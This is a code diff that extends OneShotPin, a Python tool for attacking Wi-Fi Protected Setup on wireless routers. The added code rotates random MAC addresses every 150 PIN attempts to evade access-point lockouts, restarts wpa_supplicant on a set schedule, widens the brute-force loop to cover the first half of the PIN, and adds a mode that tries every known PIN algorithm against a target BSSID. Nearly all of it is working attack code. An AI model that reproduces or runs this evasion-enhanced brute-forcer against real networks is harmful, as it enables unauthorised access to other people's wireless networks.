@@ -17,6 +17,7 @@ import csv
 from pathlib import Path
 from typing import Dict
 import wcwidth
+import random
 
 
 class NetworkAddress:
@@ -436,6 +437,10 @@ class Companion:
 
         self.bssid = bssid
         self.lastPwr = 0
+        self.pin_attempts = 0
+        self.PIN_RESET_THRESHOLD = 375  # 设置重置阈值为375次
+        self.MAC_CHANGE_THRESHOLD = 150  # Change MAC every 150 PINs
+        self.used_macs = set()  # Keep track of used MAC addresses
 
     def __init_wpa_supplicant(self):
         print('[*] Running wpa_supplicant…')
@@ -450,6 +455,36 @@ class Companion:
             if os.path.exists(self.wpas_ctrl_path):
                 break
             time.sleep(.1)
+            
+    def generate_random_mac(self):
+        """Generate a random, non-repeated MAC address"""
+        while True:
+            # Generate random MAC with locally administered bit set
+            mac = [random.randint(0, 255) & 0xFC | 0x02]  # First octet with local bit
+            mac.extend([random.randint(0, 255) for _ in range(5)])
+            mac_str = ':'.join(f'{x:02x}' for x in mac)
+            
+            if mac_str not in self.used_macs:
+                self.used_macs.add(mac_str)
+                return mac_str
+                
+    def change_mac_address(self):
+        """Change the interface MAC address"""
+        new_mac = self.generate_random_mac()
+        
+        # Down the interface
+        subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
+        
+        # Change MAC address
+        subprocess.run(['ip', 'link', 'set', self.interface, 'address', new_mac], check=True)
+        
+        # Up the interface
+        subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
+        
+        print(f'[*] Changed MAC address to: {new_mac}')
+        
+        # Wait for interface to be ready
+        time.sleep(1)
 
     def sendOnly(self, command):
         """Sends command to wpa_supplicant"""
@@ -693,8 +728,50 @@ class Companion:
         self.sendOnly('WPS_CANCEL')
         return False
 
+    def reinitialize(self):
+        """重新初始化wpa_supplicant和套接字资源"""
+        # 清理现有资源
+        self.cleanup()
+            # 重新初始化所有资源
+        self.tempdir = tempfile.mkdtemp()
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
+            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
+            self.tempconf = temp.name
+        self.wpas_ctrl_path = f"{self.tempdir}/{self.interface}"
+        self.__init_wpa_supplicant()
+    
+        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
+        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+        self.retsock.bind(self.res_socket_file)
+    
+        # 重置计数器
+        self.pin_attempts = 0
+        
+
+
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
+        
+        self.pin_attempts += 1
+
+        # Check if we need to change MAC address
+        if self.pin_attempts % self.MAC_CHANGE_THRESHOLD == 0:
+            try:
+                self.change_mac_address()
+                # Reinitialize wpa_supplicant after MAC change
+                self.reinitialize()
+            except subprocess.CalledProcessError as e:
+                print(f'[!] Failed to change MAC address: {e}')
+                return False
+    
+    
+    
+        # 检查是否需要重置
+        if self.pin_attempts >= self.PIN_RESET_THRESHOLD:
+            print('[*] Reinitializing wpa_supplicant after {} attempts...'.format(self.PIN_RESET_THRESHOLD))
+            self.reinitialize()
+        
+        
         if not pin:
             if pixiemode:
                 try:
@@ -780,7 +857,7 @@ class Companion:
         @s_half — 3-character string
         """
         checksum = self.generator.checksum
-        while int(s_half) < 1000:
+        while int(f_half) < 10000:
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
             self.single_connection(bssid, pin)
@@ -789,7 +866,11 @@ class Companion:
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
                 return self.__second_half_bruteforce(bssid, f_half, s_half)
-            s_half = str(int(s_half) + 1).zfill(3)
+            if int(s_half) == 999:
+                s_half = str(0).zfill(3)
+                f_half = str(int(f_half) + 1).zfill(4)
+            else:
+                s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
                 time.sleep(delay)
@@ -841,6 +922,19 @@ class Companion:
         shutil.rmtree(self.tempdir, ignore_errors=True)
         os.remove(self.tempconf)
 
+    def try_all_pins(self, bssid, pixiemode=False, showpixiecmd=False, pixieforce=False):
+        """Try all possible PIN algorithms for a given BSSID"""
+        print('[*] Trying all possible PIN algorithms...')
+        # Get all pins using WPSpin generator
+        pins = self.generator.getAll(bssid)
+    
+        for algo in pins:
+            print(f"\n[*] Trying {algo['name']} algorithm...")
+            pin = algo['pin']
+            if self.single_connection(bssid, pin, pixiemode, store_pin_on_fail=False):
+                return True
+        return False
+    
     def __del__(self):
         #self.cleanup()
         try:
@@ -1150,6 +1244,7 @@ Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use
 
 Optional arguments:
+    -A, --all-pins           : Try all possible PIN algorithms (both static and non-static)
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
@@ -1181,7 +1276,11 @@ if __name__ == '__main__':
         description='OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
         )
-
+    parser.add_argument(
+        '-A', '--all-pins',
+        action='store_true',
+        help='Try all possible PIN algorithms (both static and non-static)'
+        )
     parser.add_argument(
         '-i', '--interface',
         type=str,
@@ -1306,6 +1405,8 @@ if __name__ == '__main__':
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                    elif args.all_pins:
+                        companion.try_all_pins(args.bssid, args.pixie_dust, args.show_pixie_cmd, args.pixie_force)
                     else:
                         companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
                                                     args.show_pixie_cmd, args.pixie_force)
